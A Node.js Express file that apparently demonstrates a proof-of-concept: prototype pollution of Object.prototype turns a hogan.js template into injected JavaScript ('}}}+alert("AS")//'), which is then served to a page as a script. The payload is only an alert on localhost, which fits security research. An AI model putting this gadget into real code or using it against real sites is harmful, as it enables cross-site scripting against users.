const cookie = require('cookie');
const express = require("express");
const { open } = require("sqlite");
const sqlite = require("sqlite3");
const hogan = require("hogan.js");

const app = express();
app.use((req, res, next) => {
  res.setHeader("connection", "close");
  next();
});
app.use(express.urlencoded({ extended: true }));


function decoder(str){
    try {
        return decodeURIComponent(str)
    } catch (error) {
        return null
    }
};
var cookies = cookie.parse('a=%E;a=asf',{decode : decoder});

const TEMPLATE = `
    <tr>
      <h1>{{city}}</h1>
      <h2>{{pollution}}</h2>
      <td>{{year}}</td>
    </tr>
`;
Object.prototype.asString=true
Object.prototype.name='}}}+alert("AS")//'
app.get("/get-data", async (req, res) => {
    const template = hogan.compile(TEMPLATE);
    try {
        return res.send(template.render({ data }));
      } catch (ex) {
         res.setHeader('Content-type','text/javascript')
         res.send(template)
      }
    
})

app.post('/',(req,res)=>{
    console.log(req.body)
    res.setHeader('Content-type','text/html');
    res.send("<html><body><script src='http://localhost:1339/get-data'></script></body></html>")
})

app.listen(1339, () => {
    console.log(`Listening on http://localhost:1339`);
});
  